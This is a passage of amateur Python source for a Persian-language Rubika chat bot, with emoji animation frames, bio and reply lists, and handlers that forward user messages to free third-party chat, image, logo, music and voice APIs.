🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟧🟦🟦🟦🟦🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟦🟨🟨🟦🟧🟪🟥
🟥🟪🟧🟨🟦🟦🟨🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧🟦💛💛🟦🟧🟪🟥
🟥🟪🟧💛🟦🟦💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪⬛️⬛️⬛️⬛️🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💙💛💛💙🟧🟪🟥
🟥🟪🟧💛💙💙💛🟧🟪🟥
🟥🟪🟪🖤🖤🖤🖤🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💙💛💛💙🟧💜🟥
🟥💜🟧💛💙💙💛🟧💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🟩🟩🟩🟩🟩🟩💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💙💛💛💙🧡💜🟥
🟥💜🧡💛💙💙💛🧡💜🟥
🟥💜💜🖤🖤🖤🖤💜💜🟥
🟥💜💚💚💚💚💚💚💜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜🧡💙💛💛💙🧡💜❤️
❤️💜🧡💙💛💛💙🧡💜❤️
❤️💜🧡💛💙💙💛🧡💜❤️
❤️💜💜🖤🖤🖤🖤💜💜❤️
❤️💜💚💚💚💚💚💚💜❤️
❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️
""",
        """
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️▫️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◽️◽️
⬜️⬜️⬜️⬜️⬜️⬜️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️▫️▫️
⬜️⬜️⬜️⬜️⬜️◻️◽️◽️◽️
⬜️⬜️⬜️⬜️⬜️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️▫️▫️▫️
⬜️⬜️⬜️⬜️◻️◽️◽️◽️◽️
⬜️⬜️⬜️⬜️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️▫️▫️▫️▫️
⬜️⬜️⬜️◻️◽️◽️◽️◽️◽️
⬜️⬜️⬜️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️▫️▫️▫️▫️▫️
⬜️⬜️◻️◽️◽️◽️◽️◽️◽️
⬜️⬜️◻️◻️◻️◻️◻️◻️◻️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️▫️▫️▫️▫️▫️▫️
⬜️◻️◽️◽️◽️◽️◽️◽️◽️
⬜️◻️◻️◻️◻️◻️◻️◻️◽️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️▫️▫️▫️▫️▫️▫️▫️
◻️◽️◽️◽️◽️◽️◽️◽️◽️
◻️◻️◻️◻️◻️◻️◻️◻️◻️
""",
        """
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️▫️▫️▫️▫️▫️▫️▫️▫️
◽️◽️◽️◽️◽️◽️◽️◽️◽
""",
        """
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
▫️▫️▫️▫️▫️▫️▫️▫️▫️
""",
"ایزی ایزی تامام تامام :)"]
list_bio = [
"من یک خیال زیبا در این دنیای پوچ هستم، با دستانم به دنبال قلبی می‌گردم که به ستاره‌ها نیاز دارد. 🌌💔",
"در جاده‌ی عشق، گم شده‌ام و در جستجوی نوری که آرامش را به زندگی من برگرداند. 🌹✨",
"دلم به تنهایی خسته شده، اما همچنان در انتظار لحظه‌ای هستم که دستانی از آسمان به من دست بدهد. 🌠💔",
"زندگی چون یک پازل بی‌قطعه است، منتظرم تا قطعاتی از آن پیدا شوند و دوباره تکاملی معنادار رقم بزنند. 🧩💭",
"در زیر آسمانی که پر از ستاره‌هاست، دلم زخمی و تنهاست، اما همچنان با امید به روزی بهتر برای عشق زندگی می‌کنم. 🌌💔",
"گاهی احساس می‌کنم مثل یک بادبادکم که در آسمانی تاریک و بی‌نهایت می‌پرم، به دنبال راهی برای نوری که مرا روشنایی دهد. 🎈✨",
"زندگی مانند یک قصه‌ی بی‌پایان است، و من در آن گم شده‌ام، در جستجوی آن قسمتی که به خودم می‌بالم. 📖💭",
"در دنیایی که پر از رنگین‌کمان عشق است، من به دنبال رنگ منحصر به فرد خودم می‌گردم. 🌈💔",
"گاهی احساس می‌کنم مثل یک قطره‌ی باران تنها و گم‌شده در دریایی بی‌نهایت از احساساتم. ☔💔",
"در آغوش تاریکی از تنهایی، دلم برای لمسی از عشق تشنه‌ست. 🌌💔",
"زندگی یک رقص است و من به دنبال آهنگی هستم که با من همراه شود. 💃🎶",
"اگر چشمانم در جستجوی یک دیدار نیستند، بدانید که در حالی که دلم در عشقی دیگر گم شده است. 💔",
"هر لحظه‌ی زندگی مانند یک داستان جدید است، من به دنبال قلمی هستم که زیباترین داستان را بنویسد. 📝✨",
"در این دریای زندگی، دلم به دنبال یک بندر امان هست، جایی که با موج‌های زندگی مقابله کنم. ⚓🌊",
"گاهی احساس می‌کنم که زندگی مانند یک تئاتر است و من نقشی در آن دارم که همیشه به دنبال بهترین بازی هستم. 🎭💫",
"هر روز یک شانس جدید است، یک فرصت دیگر برای شروع دوباره و تغییر زندگی. ✨💪",
"اگر رویاهایت را تکمیل نکنی، دیگران رویاهایشان را بر روی تو تکمیل می‌کنند. 💭💫",
"بهترین راه برای پیشرفت، شروع به انجام کار است. 🚀💡",
"اگر به چیزی روی آورده‌ای، به آن پایبند بمان. پشیمان نخواهی شد که اینکار را کرده‌ای. 💪🌟",
"هر روز، یک فرصت جدید است تا زندگیت را تغییر دهی. به دنبال رویاهایت برو و آنها را به واقعیت تبدیل کن. 🌈💫",
"بزرگترین انگیزه، موفقیت دیگران است. زمانی که شاهد موفقیت دیگران هستی، انگیزه‌ی بیشتری برای خودت پیدا می‌کنی. 💡💪",
"تلاش کنید تا بهترین نسخه‌ی خودتان باشید، نه کسی که دیگران می‌خواهند شما باشید. 💫💪",
"هیچ کاری امکان‌پذیر نیست مگر اینکه شما آنرا شروع کنید. بزرگترین قدم، قدم اول است. 🚶‍♂️🌟",
"هر روز، یک فرصت جدید برای شروع دوباره است. هر لحظه، فرصتی برای تغییر است. ✨💪",
"زندگی یک سفر است و هر روز یک مسیر جدید است. مهم این است که به سمت رویاهایتان حرکت کنید. 🛣️🌟",
"im sigma",
"من هنوز زنده هستم لعنتیا",
"قاضی فقط خداست",

]
list_bot = [
    "جان ربات",
    "بله بفرماید",
    "بله من میربات ربات هوش مصنوعی هستم👋",
    "آماده دستورم",
    "آماده برای فرمان شما",
    "hello👋",
    "من میربات ربات هوش مصنوعی هستم👋",
    "میربات در خدمت شماست❤️",
    "سلام من میربات ربات هوش مصنوعی هستم ",
    "جان",
    "چی می‌خوای ",
    "جان توفقط دستور بده",
    "چی می‌خوای دلبرم",
    "باز چی می‌خوای؟",
    "جون توفقط  دستور بده",
    "سلام من ربات هستم وایشون سازنده من است :@Sepah_cyber1383 ",
    "بله؟",
    "درخدمتم",
    "چطور می‌توانم کمکتان کنم؟",
    "خوشحال می‌شوم که به شما کمک کنم",
    "بله؟ منتظر دستورات شما هستم",
    "بله، من در انتظار دستور شما هستم",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "در خدمتتان هستم، چطور می‌توانم کمکتان کنم؟",
    "سلام! ربات هستم، چه کاری می‌توانم برای شما انجام دهم؟",
    "بله؟ من در انتظار دستورات شما هستم!",
    "بله؟ منتظر دستور شما هستم!",
    "با تشکر، چه کمکی می‌توانم بکنم؟",
    "حتما، منتظر دستورات شما هستم.",
    "بله؟ منتظر دستورات شما هستم!",
    "من اینجایم، در انتظار دستورات شما.",
    "با خوشحالی منتظر دستورات شما هستم!",
    "بله؟ چه می‌خواهید؟",
    "سلام! من اینجایم، چطور می‌توانم به شما کمک کنم؟",
    "سلام! من آماده‌ام، چطور می‌توانم به شما کمک کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ چه کاری دارید؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من اینجایم، چه می‌توانم برای شما انجام دهم؟",
    "بله؟ من در انتظار دستور شما هستم!",
    "حاضرم، چطور می‌توانم کمکتان کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم.",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ من در انتظار دستورات شما هستم!",
    "حاضرم، چطور می‌توانم کمکتان کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم.",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ من در انتظار دستورات شما هستم!",
    "حاضرم، چطور می‌توانم کمکتان کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم.",
    "با تشکر، چه کمکی می‌توانم بکنم؟",
    "حتما، منتظر دستورات شما هستم.",
    "بله؟ منتظر دستورات شما هستم!",
    "من اینجایم، در انتظار دستورات شما.",
    "با خوشحالی منتظر دستورات شما هستم!",
    "بله؟ چه می‌خواهید؟",
    "سلام! من اینجایم، چطور می‌توانم به شما کمک کنم؟",
    "سلام! من آماده‌ام، چطور می‌توانم به شما کمک کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ چه کاری دارید؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم.",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ من در انتظار دستورات شما هستم!",
    "حاضرم، چطور می‌توانم کمکتان کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم.",
    "سلام! چطور می‌توانم به شما کمک کنم؟",
    "بله؟ من در انتظار دستورات شما هستم!",
    "حاضرم، چطور می‌توانم کمکتان کنم؟",
    "بله؟ چطور می‌توانم به شما کمک کنم؟",
    "سلام! من اینجایم و آماده به شما کمک کردن هستم.",
    "سلام! من در خدمت شما هستم. دستوری دارید؟",
    "بله؟ من اینجایم و منتظر دستورات شما هستم."
]
def fetch_random_logo(text):
    url = f"https://api-free.ir/api/Logo-top.php?text={text}&page={str(random.randint(1, 99))}"
    try:
        response = requests.get(url)
        data = response.json()
        if 'result' in data and data['result']:
            return random.choice(data['result'])
        else:
            return None
    except Exception as e:
        print("Error occurred:", e)
        return None

def download_logo_and_send(logo_url, update:Updates):
    try:
        response = requests.get(logo_url)
        image = Image.open(BytesIO(response.content))
        image_file = BytesIO()
        image.save(image_file, format='PNG')
        image_file.seek(0)
        update.reply_photo("logo_man.png",caption="لگوی شمااماده شد\n https://t.me/pythonsource1384")
        
        # bot.send_photo(chat_id, photo=image_file)
        # bot.send_message(chat_id, "Logo generated successfully.")
    except Exception as e:
        print("Error occurred while sending logo:", e)
        # bot.send_message(chat_id, "Error occurred while generating logo.")

def translate_to_hebrew(text):
    translator = Translator()
    translated_text = translator.translate(text, src='fa', dest='he').text
    return translated_text
def load_knowledge_base_from_json():
    try:
        with open(knowledge_base_file, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_knowledge_base_to_json(knowledge_base):
    with open(knowledge_base_file, "w") as file:
        json.dump(knowledge_base, file, ensure_ascii=True, indent=4)

def load_knowledge_base_from_db():
    knowledge_base = {}
    cursor.execute("SELECT * FROM knowledge_base")
    rows = cursor.fetchall()
    for row in rows:
        knowledge_base[row[0]] = row[1]
    return knowledge_base

def save_knowledge_base_to_db(knowledge_base):
    cursor.execute("DELETE FROM knowledge_base")
    for key, value in knowledge_base.items():
        cursor.execute("INSERT INTO knowledge_base (key, value) VALUES (?, ?)", (key, value))
    conn.commit()

def load_knowledge_base():
    knowledge_base_json = load_knowledge_base_from_json()
    knowledge_base_db = load_knowledge_base_from_db()
    # Merge data from JSON and DB
    knowledge_base = {**knowledge_base_json, **knowledge_base_db}
    return knowledge_base

def save_knowledge_base(knowledge_base):
    save_knowledge_base_to_json(knowledge_base)
    save_knowledge_base_to_db(knowledge_base)

knowledge_base = load_knowledge_base()
def save_to_database(text, response):
    connection = sqlite3.connect('chatgpt.db')
    cursor = connection.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS Responses (input_text TEXT, gpt_response TEXT)')
    cursor.execute('INSERT INTO Responses VALUES (?, ?)', (text, response))
    connection.commit()
    connection.close()
def gpt_4(text):
    s =requests.Session()
    chat=s.get(f"http://www.mahrez.iapp.ir/Gpt/?text={text}").json()["message"]
    return f"پاسخ شما :\n{chat}"

def gpt_lama(text):
    s=requests.session()
        
       
      
        
    l=s.get(f"http://api-free.ir/api/llama.php?text={text}").json()["result"]  
    english_text =l
    persian_text = GoogleTranslator(source='auto', target='fa').translate(english_text)
        
   
    return f"پاسخ :\n{persian_text}"
            
def get_images(text):
    response = requests.get(f'http://api-free.ir/api/img.php?v=4&text={text}')
    if response.status_code == 200:
        data = response.json()
        return data.get('result', [])
    else:
        return []   


def chatgpt4(text):
    s = requests.Session()
    
    chat = s.get(f"https://api.chbk.run/chatgpt2?text={text}").json()["data"]
    return chat
    


def get_int(value: str):
    try:
        return int(value)
    
    except (ValueError, TypeError):
        return None
          
def font_to_database(fonts):
    try:
        # اتصال به پایگاه داده SQLite
        connection = sqlite3.connect('fonts.db')
        cursor = connection.cursor()
        
        # ایجاد جدول اگر وجود نداشته باشد
        cursor.execute('''CREATE TABLE IF NOT EXISTS fonts 
                          (id INTEGER PRIMARY KEY, font_name TEXT)''')
        
        # وارد کردن فونت‌ها به پایگاه داده
        for font in fonts:
            cursor.execute("INSERT INTO fonts (font_name) VALUES (?)", (font,))
        
        # ذخیره تغییرات و بستن اتصال
        connection.commit()
        connection.close()
    except Exception as e:
        print(f"Error while saving to database: {e}")
def get_random_music_link():
    api_url = "https://api-free.ir/api/music/"
    response = requests.get(api_url)
    if response.status_code == 200:
        data = response.json()
        if data.get("ok") and data.get("result") and data["result"].get("song"):
            return data["result"]["song"]
    return None

def download_and_save_music(file_path, music_link):
    response = requests.get(music_link)
    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
def gpt3_(text):
    gpt =requests.get(f"https://api4.haji-api.ir/api/ai/ChatGPT/3/?text={text}").json()["result"]
    return f"پاسخ :\n{gpt}"
def is_prime(num):
    if num <= 1:
        return False
    elif num <= 3:
        return True
    elif num % 2 == 0 or num % 3 == 0:
        return False
    i = 5
    while i * i <= num:
        if num % i == 0 or num % (i + 2) == 0:
            return False
        i += 6
    return True
def get_bmi_category(bmi):
    if bmi < 18.5:
        return "کمبود وزن"
    elif 18.5 <= bmi < 25:
        return "طبیعی"
    elif 25 <= bmi < 30:
        return "اضافه وزن"
    else:
        return "چاقی"

def is_badword(word_list, text):
    # Change text and words to low mode
    words = [word.lower() for word in word_list]
    text = text.lower()

    # Make pattern By using the words
    pattern = re.compile(rf'\b(?:{"|".join(map(re.escape, words))})\b')

    # Search in text
    return bool(pattern.search(text))
def get_filename():
    return str(random.random()) + '.jpg'
warnings = {}
guid ="g0DtNHM0f4a499111d7bd4b228db6d7e"

def is_bug(update: Updates, result):
    try:
        if update.file_inline and update.file_inline.type in ['Voice', 'Music', 'Video']:
            if update.file_inline.time is None:
                return update.is_group

    except AttributeError:
        pass

@bot.on_message_updates(filters.is_group)
async def updates(update: Updates):
    text =update.text
    
    if text =="قنواتی":
        await update.reply("بدون گوند")
    elif text =="محمد":
        await update.reply("بهتره بگید دختر چو ن اسمش سار هست")
    
        

   
    
    # if update.is_admin:

    #     if update.text:
    #         text = update.text.split("=")
    #         if len(text) == 2:
    #             key = text[0].strip()
    #             value = text[1].strip()
    #             knowledge_base[key] = value
    #             save_knowledge_base(knowledge_base)
    #             await update.reply("آموخته شد! تشکر")
                
                
        

# @bot.on_message_updates(filters.is_group)
# def echo_learn(update: Updates):

    # if update.is_admin:
        
    #     if update.text:
    #         text = update.text.strip()
    #         if text in knowledge_base:
    #             update.reply(knowledge_base[text])

@bot.on_message_updates()
def chatbot(update: Updates):
   
    
    input_text =update.text.replace("+","")
    if update.text.startswith("+"):
        update.reply("منتظربمانید")
        response = gpt_4(input_text)
        update.reply(response)
        save_to_database(input_text, response)
    elif update.text.startswith("*"):
        l=update.text.replace("*","")
        g=gpt_lama(l)
        try:
            update.reply(g)
            save_to_database(l, g)
            
        except Exception as lam:
            
            update.reply(f"erorr:{lam}")
    elif update.text.startswith("/"):
        g =update.text.replace("/","")
        update.reply("منتظربمانید")
        re=gpt3_(g)
        try:
            update.reply(re)
        except Exception as s3:
         update.reply(f"erorr:\n {s3}")
    elif update.text.startswith("سوال"):
        sal =update.text.replace("سوال","")
        g =chatgpt4(sal)
        update.reply("منتظربمانید")
        try:
            update.reply(g)
        except Exception as g4:
            update.reply(g4)
            
        
        
   
        
        
         
            
          
    



        
   
        
@bot.on_message_updates()
def image_ai(update: Updates):
    
    guid =update.object_guid
    msg =update.message_id
    r_msg=update.reply_message_id
    

  
    
    input_text =update.text.replace("image","")
    if update.text.startswith("image"):
        
        update.reply("منتظر ارسال عکس باشید")
        try:
            response = requests.get(f"http://api-free.ir/api/img.php?text={input_text}&v=3.5")
            response.raise_for_status()
                
            data = response.json()
            result = data["result"]
            
            # انتخاب یک عنصر تصادفی از لیست result
            random_link = random.choice(result)
            
            response = requests.get(random_link, stream=True)
            response.raise_for_status()
            
            
            with open("downloaded_image.jpg", "wb") as out_file:
                
                update.reply("به زودی ارسال میشه")
                shutil.copyfileobj(response.raw, out_file)
                # bot.send_photo(guid,'downloaded_image.jpg',reply_to_message_id=msg,caption="تصویرشمااماده شد عزیز:\n@python_code_1384")
                
               
                update.reply_photo("downloaded_image.jpg",caption="عکس شما حاضرشد:\nhttps://t.me/pythonsource1384\n@Python_Source_1403")
                
                
                
        except requests.exceptions.RequestException as e:
            
            
            update.reply(f"erorr:{e}")
    elif update.text.startswith("بده"):
        update.reply("منتظر ارسال لینک عکس باشید")
        i =update.text.replace("بده","")
        images = get_images(i)
        if images:
            
            selected_image = random.choice(images)
            update.reply(f"لینک عکس شما اماده شدمیتونید واردلینک وعکس خودراببینید\n{selected_image}")
    elif update.text.startswith("تصویر"):
        
        input_ =update.text.replace("تصویر","")
        update.reply("منتظر ارسال عکس باشید")
        
        try:
            
            response = requests.get(f"http://api-free.ir/api/img.php?v=4&text={input_}")
            response.raise_for_status()
                
            data = response.json()
            result = data["result"]
            
            # انتخاب یک عنصر تصادفی از لیست result
            random_link = random.choice(result)
            
            response = requests.get(random_link, stream=True)
            response.raise_for_status()
            
            with open("downloaded_image.jpg", "wb") as out_file:
                
                
                
                update.reply("به زودی ارسال میشه")
                shutil.copyfileobj(response.raw, out_file)
                # bot.send_photo(guid,'downloaded_image.jpg',reply_to_message_id=msg,caption="تصویرشمااماده شد عزیز:\n@python_code_1384")
                
               
                update.reply_photo("downloaded_image.jpg",caption="اماده شد:\nhttps://t.me/pythonsource1384\n@Python_Source_1403")
                
                
                
        except requests.exceptions.RequestException as e:
            
            
            update.reply(f"erorr:{e}")
            
            
               
        
        
         

            
@bot.on_message_updates()
def voice_ai(update: Updates):
    voice =update.text.replace("مونث","")
    if update.text.startswith("مونث"):
        update.reply("منتظرویس مونث باشید")
        try:
            response = requests.get(f"https://api-free.ir/api/voice.php?text={voice}&mod=DilaraNeural")
            response.raise_for_status()  # بررسی موفقیت درخواست
            
            result_url = response.json()["result"]
            
            
            update.reply("الان میدم خدمت شما")
            
            voice_response = requests.get(result_url)
            
            voice_response.raise_for_status()
            # بررسی موفقیت درخواست
            
